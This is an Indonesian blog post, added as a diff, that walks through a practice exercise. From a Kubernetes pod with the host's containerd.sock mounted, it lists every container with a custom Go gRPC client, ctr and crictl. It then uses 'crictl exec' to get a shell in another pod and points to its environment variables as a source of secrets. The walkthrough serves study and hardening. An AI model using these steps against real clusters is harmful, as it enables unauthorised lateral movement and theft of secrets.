@@ -1,0 +1,320 @@
+---
+title: Berinteraksi Dengan Socket containerd Dari Dalam Pod
+date: 2024-11-06
+tags: [Kubernetes, Container, Go]
+excerpt: Anggap saja saya berhasil mendapatkan *shell* di Pod yang men-*mount* `containerd.sock` dari *host* ke dalam Pod tersebut.  File `containerd.sock` adalah Unix *socket* yang disediakan untuk berinteraksi dengan `containerd` (sama seperti file `docker.sock` yang dipakai oleh perintah `docker`). Apa yang bisa saya lakukan dengan *socket* tersebut?
+---
+
+Anggap saja saya berhasil mendapatkan *shell* di Pod yang men-*mount* `containerd.sock` dari *host* ke dalam Pod tersebut.  File `containerd.sock` adalah Unix *socket* yang disediakan untuk berinteraksi dengan `containerd` (sama seperti file `docker.sock` yang dipakai oleh perintah `docker`). Apa yang bisa saya lakukan dengan file *socket* tersebut?
+
+:::note
+Apa bedanya `containerd` dan Docker?  `containerd` merupakan bagian *container runtime* dari Docker yang dipisahkan menjadi proyek tersendiri. Tugas utama `containerd` adalah mengelola *image* dan menjalankannya sebagai *container*, sementara tugas Docker mencakup proses yang lebih besar lagi seperti membuat *image* baru dari `Dockerfile`.  Kode program Docker Engine di https://github.com/moby/moby tetap menyertakan `containerd` sebagai *dependency*.
+:::
+
+Container Runtime Interface (CRI) adalah komponen Kubernetes yang berkomunikasi dengan *container runtime*.  Dengan CRI, Kubernetes tidak perlu terikat pada satu jenis *container runtime*.  Pada awalnya, *container runtime* yang dipakai oleh Kubernetes adalah Docker.  Namun, saat ini status Docker sebagai CRI sudah *deprecated*.  Salah satu calon penerusnya adalah `containerd`.  Ia merupakan alternatif yang paling banyak dipakai (misalnya `containerd` adalah CRI *default* di GKE).
+
+Bila dilihat dari luar, tidak ada perubahan berarti karena *developer* tetap menggunakan Docker untuk membuat *image* baru.   Namun, khusus untuk aplikasi yang perlu berinteraksi langsung dengan *container runtime* seperti *monitoring agent*, lokasi file *socket* untuk `containerd` adalah `/run/containerd/containerd.sock` (yang juga tersedia di `/var/run/containerd/containerd.sock`).  Lokasi ini berbeda dengan *socket* Docker yang ada di `/var/run/docker.sock`.
+
+Sebagai latihan, anggap saja saya berada di sebuah *cluster* Kubernetes yang menggunakan `containerd` dan memiliki *workload* dengan definisi seperti berikut ini:
+
+```yaml title="deployment.yaml"
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: nginx
+  labels:
+    app: nginx
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: nginx
+  template:
+    metadata:
+      labels:
+        app: nginx
+    spec:      
+      securityContext:
+        {}
+      containers:
+        - name: nginx
+          image: ubuntu/nginx:latest
+          imagePullPolicy: IfNotPresent
+          volumeMounts:
+            - name: containerd-sock
+              mountPath: /run/containerd/containerd.sock
+      volumes:
+        - name: containerd-sock
+          hostPath:
+            path: /run/containerd/containerd.sock
+---
+
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: internal-secret-nginx
+  labels:
+    app: internal-secret-nginx
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: internal-secret-nginx
+  template:
+    metadata:
+      labels:
+        app: internal-secret-nginx
+    spec:            
+      containers:
+        - name: nginx
+          image: ubuntu/nginx:latest
+          imagePullPolicy: IfNotPresent
+```
+
+Pada definisi di atas, terdapat 2 Deployment berbeda: `nginx` dan `internal-secret-nginx`.  Deployment `nginx` memiliki akses ke `/run/containerd/containerd.sock` yang ada di *host*.  Bila seandainya saya berhasil mendapatkan *shell* di Pod `nginx`, maka secara tidak langsung saya juga bisa melakukan *lateral movement* untuk mendapatkan *shell* di Pod `internal-secret-nginx`.
+
+:::note
+Penggunaan *socket* milik CRI di dalam Pod tidak selalu berarti celah keamanan karena aplikasi tertentu seperti *monitoring agent* dan *security agent* perlu mengakses seluruh *container* yang ada di mesin yang sama.  Sebagai contoh, [node-exporter](https://github.com/prometheus-operator/kube-prometheus/blob/main/manifests/nodeExporter-daemonset.yaml) di kube-prometheus bisa mengakses seluruh file *host* lewat folder `/host/root`, New Relic agent men-*mount* *socket* Docker ke dalam Pod seperti di [newrelic-daemonset.yaml](https://github.com/kubernetes/examples/blob/master/staging/newrelic/newrelic-daemonset.yaml), Datadog agent di file [datadog-agent.yaml](https://docs.datadoghq.com/resources/yaml/datadog-agent-all-features.yaml) bisa mengakses isi `/var/run` milik *host* di folder `/host/var/run`.
+
+Terlepas dari aksesnya yang lebih luas dibanding aplikasi biasa, metode ini tetap lebih aman daripada melakukan instalasi *agent* tersebut langsung di *node* (mesin *host*) tanpa melalui *container*!
+:::
+
+## Metode Low Level
+
+Berbeda dengan Docker yang menggunakan HTTP, `containerd` menggunakan protokol gRPC dalam komunikasi *socket*-nya.  Oleh sebab itu, saya tidak bisa menggunakan cURL seperti di *socket* Docker.  Cara yang paling gampang untuk menggunakan gRPC adalah membuat kode program *client* gRPC.  Saya akan mulai dengan membuat sebuah proyek Go baru dan memberikan perintah berikut ini untuk menambahkan *dependency* ke library gRPC:
+
+```shell
+$ go get google.golang.org/grpc@latest
+$ go get google.golang.org/protobuf@latest
+$ go get github.com/containerd/containerd/api/services/containers/v1
+$ go get github.com/containerd/containerd/protobuf/types
+$ go get github.com/containerd/containerd/errdefs
+```
+
+Saya kemudian membuat kode program berikut ini:
+
+```go title="client.go"
+package main
+
+import (
+	"context"
+	containersapi "github.com/containerd/containerd/api/services/containers/v1"
+	"github.com/containerd/containerd/namespaces"
+	"google.golang.org/grpc"
+	"google.golang.org/grpc/credentials/insecure"
+	"log"
+)
+
+type namespaceInterceptor struct {
+	namespace string
+}
+
+func (ni namespaceInterceptor) unary(ctx context.Context, method string, req, reply interface{}, cc *grpc.ClientConn, invoker grpc.UnaryInvoker, opts ...grpc.CallOption) error {
+	_, ok := namespaces.Namespace(ctx)
+	if !ok {
+		ctx = namespaces.WithNamespace(ctx, ni.namespace)
+	}
+	return invoker(ctx, method, req, reply, cc, opts...)
+}
+
+func (ni namespaceInterceptor) stream(ctx context.Context, desc *grpc.StreamDesc, cc *grpc.ClientConn, method string, streamer grpc.Streamer, opts ...grpc.CallOption) (grpc.ClientStream, error) {
+	_, ok := namespaces.Namespace(ctx)
+	if !ok {
+		ctx = namespaces.WithNamespace(ctx, ni.namespace)
+	}
+
+	return streamer(ctx, desc, cc, method, opts...)
+}
+
+func newNSInterceptors(ns string) (grpc.UnaryClientInterceptor, grpc.StreamClientInterceptor) {
+	ni := namespaceInterceptor{
+		namespace: ns,
+	}
+	return grpc.UnaryClientInterceptor(ni.unary), grpc.StreamClientInterceptor(ni.stream)
+}
+
+func main() {
+	log.SetFlags(0)
+	unary, stream := newNSInterceptors("k8s.io")
+	gopts := []grpc.DialOption{
+		grpc.WithTransportCredentials(insecure.NewCredentials()),
+		grpc.WithChainUnaryInterceptor(unary),
+		grpc.WithStreamInterceptor(stream),
+	}
+	cn, err := grpc.NewClient("unix:///run/containerd/containerd.sock", gopts...)
+	if err != nil {
+		log.Fatalf("failed to connect: %v", err)
+	}
+	defer cn.Close()
+	client := containersapi.NewContainersClient(cn)
+	request := containersapi.ListContainersRequest{}
+	resp, err := client.List(context.Background(), &request)
+	if err != nil {
+		log.Fatalf("failed to retrieve containers: %v", err)
+	}
+	containers := resp.GetContainers()
+	for _, c := range containers {
+		log.Printf("%s (%s) => %s\n", c.Labels["io.kubernetes.pod.name"], c.Labels["io.kubernetes.pod.namespace"], c.ID)
+	}
+}
+```
+
+Pada kode program di atas, untuk menggunakan Unix *socket* di gRPC, saya melewatkan nilai seperti `unix:///run/containerd/containerd.sock` sebagai argumen untuk `grpc.NewClient()`.  Kubernetes akan menggunakan *namespace* `k8s.io` di `containerd` sehingga saya perlu melewatkan *interceptor* untuk mengatur nilai *namespace*.  Kemudian,saya memanggil method `List` dari `Containers` untuk mendapatkan daftar seluruh *container* yang ada.
+
+Setelah men-*build* kode program di atas dan menyalin hasil *binary*-nya ke dalam Pod (misalnya di-*download* lewat HTTP), saya akan menemukan hasil eksekusinya yang terlihat seperti berikut ini:
+
+```
+nginx-6567f457b6-f8sld (default) => 37b522b2c3db88255dc10ec086019d62ec8a37eaa3d34c82f741b2e11cea4a10
+internal-secret-nginx-6f859b945c-xgbp2 (default) => 2b70c6759a460d05489f81c5e32f5bfb532c1fa2bca62254f45292aac2bf9369
+storage-provisioner (kube-system) => 0344447ae06850954acbeb2872750e21d019c5232803d00c46bc3e832da87c5b
+kube-scheduler-minikube (kube-system) => 096d0c75f9f1410327ab988bfa7cd0caed254323eb222e56df340915c9339544
+etcd-minikube (kube-system) => 16a12f0bf3c88a79f39096283fed86d71e7ef7e03b953876d0317fe47d8f6ae1
+kube-controller-manager-minikube (kube-system) => 1c554a79f0e42db1ba4b70495ee1a07358755a43f606f734168bf5abd93fd434
+kube-apiserver-minikube (kube-system) => 2a9724535060ac72c1f8ca2d2cd0ce118dd27af37211e518c69d5d317e2c3ed0
+...
+```
+
+Terlihat bahwa walaupun saya berada di Pod `nginx`, saya bisa melihat *container* di Pod lain seperti milik Pod `internal-secret-nginx`.  Saya bahkan bisa melihat container milik Kubernetes di `kube-system`.
+
+Berkomunikasi dengan *socket* langsung dari kode program buatan sendiri tidak direkomendasikan karena repetitif dan rentan terhadap kesalahan (kecuali tujuannya adalah mengerjakan *exploit* tertentu).  Saya melakukannya hanya untuk menunjukkan bahwa Unix *socket* milik *container runtime* seperti `containerd.sock` dan `docker.sock` dapat langsung dipakai untuk mengakses *container runtime* secara keseluruhan (walaupun kesannya terlihat hanya seperti sebuah file biasa).  Cara yang lebih mudah untuk memanggil API `containerd` adalah dengan menggunakan CLI resmi seperti `ctr` dan `crictl`.
+
+## ctr
+
+CLI resmi yang dibuat untuk berkomunikasi dengan `containerd` adalah `ctr`.  Tool ini sudah menjadi bagian dari file rilis `containerd`.  Sebagai contoh, untuk men-*download* file ini dari dalam *shell* milik Pod `nginx`, saya akan memberikan perintah seperti berikut ini:
+
+```shell
+$ apt update && apt install curl
+$ cd /tmp
+$ curl -o containerd-2.0.0-linux-amd64.tar.gz -L https://github.com/containerd/containerd/releases/download/v2.0.0/containerd-2.0.0-linux-amd64.tar.gz
+$ tar xvf containerd-2.0.0-linux-amd64.tar.gz
+$ export PATH=$PATH:/tmp/bin
+```
+
+Setelah file berhasil di-*download* dan di-*extract*, saya dapat memberikan perintah seperti berikut ini untuk melihat *container* yang sedang aktif:
+
+```shell
+$ ctr -n k8s.io containers ls
+
+##
+## Output:
+##
+## CONTAINER                                                           IMAGE                                         RUNTIME                  
+## 37b522b2c3db88255dc10ec086019d62ec8a37eaa3d34c82f741b2e11cea4a10    docker.io/ubuntu/nginx:latest                 io.containerd.runc.v2    
+## 2b70c6759a460d05489f81c5e32f5bfb532c1fa2bca62254f45292aac2bf9369    docker.io/ubuntu/nginx:latest                 io.containerd.runc.v2    
+## 65671568bc715a7ee2384b98fd3876a61c641b2328202507956be4de77180be9    registry.k8s.io/kube-proxy:v1.31.0            io.containerd.runc.v2    
+## 67a915b401fdfccacbc5bedc63ef0305290fb5963c44689dae00e665e89d0575    gcr.io/k8s-minikube/storage-provisioner:v5    io.containerd.runc.v2    
+## ...    
+
+```
+
+Tampilan dari `ctr containers ls` terlihat sangat sederhana.  Saya tidak punya menemukan pilihan untuk menambahkan kolom lain seperti label untuk melihat nama pod dan namespace dari setiap baris *container id*.  Sebagai gantinya, saya bisa menggunakan perintah `ctr containers info` untuk mendapat informasi detail setiap *container* satu per satu dengan menyertakan *container id* (kolom pertama) seperti pada perintah berikut ini:
+
+```shell
+$ ctr -n k8s.io containers info 37b522b2c3db88255dc10ec086019d62ec8a37eaa3d34c82f741b2e11cea4a10
+
+##
+## Output:
+## {
+##    "ID": "37b522b2c3db88255dc10ec086019d62ec8a37eaa3d34c82f741b2e11cea4a10",
+##    "Labels": {
+##        "io.cri-containerd.kind": "container",
+##        "io.kubernetes.container.name": "nginx",
+##        "io.kubernetes.pod.name": "nginx-6567f457b6-f8sld",
+##        "io.kubernetes.pod.namespace": "default",
+##        "io.kubernetes.pod.uid": "2c59e27c-b30c-4d26-ab56-9952132ec6c6",
+##        "org.opencontainers.image.ref.name": "ubuntu",
+##        "org.opencontainers.image.version": "24.04"
+##    },
+##    "Image": "docker.io/ubuntu/nginx:latest",
+##    "Runtime": {
+##        "Name": "io.containerd.runc.v2",
+##        "Options": null
+##    },
+##    ...
+## }
+
+$ ctr -n k8s.io containers info 2b70c6759a460d05489f81c5e32f5bfb532c1fa2bca62254f45292aac2bf9369
+
+##
+## Output:
+## {
+##    "ID": "2b70c6759a460d05489f81c5e32f5bfb532c1fa2bca62254f45292aac2bf9369",
+##    "Labels": {
+##        "io.cri-containerd.kind": "container",
+##        "io.kubernetes.container.name": "nginx",
+##        "io.kubernetes.pod.name": "internal-secret-nginx-6f859b945c-xgbp2",
+##        "io.kubernetes.pod.namespace": "default",
+##        "io.kubernetes.pod.uid": "0ed42806-b33b-448c-848a-691adee35f77",
+##        "org.opencontainers.image.ref.name": "ubuntu",
+##        "org.opencontainers.image.version": "24.04"
+##    },
+##    "Image": "docker.io/ubuntu/nginx:latest",
+##    "Runtime": {
+##        "Name": "io.containerd.runc.v2",
+##        "Options": null
+##    },
+##    ...
+## }
+
+```
+
+Hasil di atas menunjukkan bahwa salah satu Pod `internal-secret-nginx` dijalankan melalui *container*  dengan ID `2b70c6759a460d05489f81c5e32f5bfb532c1fa2bca62254f45292aac2bf9369`.  Sampai disini saya bisa melakukan *lateral movement* dengan mengerjakan perintah pada *container* tersebut.  Namun, saat mencobanya, `ctr` mengalami kegagalan dalam membuat *pipe*.  Sebagai gantinya, pada langkah berikutnya, saya akan menggunakan `crictl`.
+
+## crictl
+
+Bila `ctr` adalah *tool* yang datang dari `containerd`, maka `crictl` adalah tool resmi dari Kubernetes untuk berkomunikasi dengan komponen Container Runtime Interface (CRI).  Dengan demikian, `crictl` tidak hanya mendukung `containerd`, namun juga *container runtime* lain yang didukung oleh CRI.
+
+Untuk men-*download* `crictl`, setelah mendapatkan akses *shell* ke *container* yang menjalankan `nginx`, saya akan mengerjakan perintah berikut ini dari dalam *container* tersebut:
+
+```shell
+$ apt update && apt install curl
+$ cd /tmp
+$ curl -o crictl-v1.31.1-linux-amd64.tar.gz -L https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.31.1/crictl-v1.31.1-linux-amd64.tar.gz
+$ tar zxvf crictl-v1.31.1-linux-amd64.tar.gz
+```
+
+`crictl` dapat menampilkan Pod (sama seperti `kubectl`) dengan perintah seperti berikut ini:
+
+```shell
+# ./crictl pods
+
+##
+## Output:
+##
+## POD ID              CREATED         STATE      NAME                                     NAMESPACE           ATTEMPT             RUNTIME
+## 321592394249f       1 hours ago     Ready      internal-secret-nginx-6f859b945c-xgbp2   default             2                   (default)
+## 37b522b2c3db8       1 hours ago     Ready      nginx-6567f457b6-f8sld                   default             1                   (default)
+## db727d77a96d4       1 hours ago     Ready      coredns-6f6b679f8f-c9mq2                 kube-system         3                   (default)
+## 72c11de1f09d3       1 hours ago     Ready      kube-proxy-tmk9f                         kube-system         3                   (default)
+## ...
+```
+
+`crictl` juga dapat menampilkan daftar *container* yang sedang berjalan dengan perintah seperti:
+
+```shell
+# ./crictl ps
+
+## 
+## Output:
+##
+## CONTAINER       IMAGE           CREATED  STATE      NAME                 ATTEMPT    POD ID          POD
+## e9770a607317a   e07ed226fd3cf   ago      Running    nginx                1          37b522b2c3db8   nginx-6567f457b6-f8sld
+## 30355778753f0   e07ed226fd3cf   ago      Running    nginx                2          321592394249f   internal-secret-nginx-6f859b945c-xgbp2
+## 378cfc55a016c   6e38f40d628db   ago      Running    storage-provisioner  7          0344447ae0685   storage-provisioner
+## 9bfc662413843   cbb01a7bd410d   ago      Running    coredns              3          db727d77a96d4   coredns-6f6b679f8f-c9mq2
+## ...
+```
+
+Terlihat bahwa hasil perintah `crictl` jauh lebih lengkap bila dibandingkan dengan hasil `ctr` sebelumnya.
+
+Sekarang, saatnya untuk melakukan *lateral movement*.  Dari Pod `nginx`, saya akan mengerjakan perintah berikut ini untuk masuk ke *container* milik `internal-secret-nginx`:
+
+```shell "30355778753f0"
+$ ./crictl exec -it 30355778753f0 bash
+root@internal-secret-nginx-6f859b945c-xgbp2:/# hostname
+## 
+## Output:
+## internal-secret-nginx-6f859b945c-xgbp2
+```
+
+Ini hampir sama seperti menjalankan `kubectl exec -it`, hanya saja saya bukan nama Pod yang dilewatkan melainkan *container id*.  Selain mengerjakan *shell* di *container* lain, saya juga dapat melihat *environment variables* di *container* yang ada karena biasanya nilai *secret* akan dilewatkan sebagai *environment variables*.
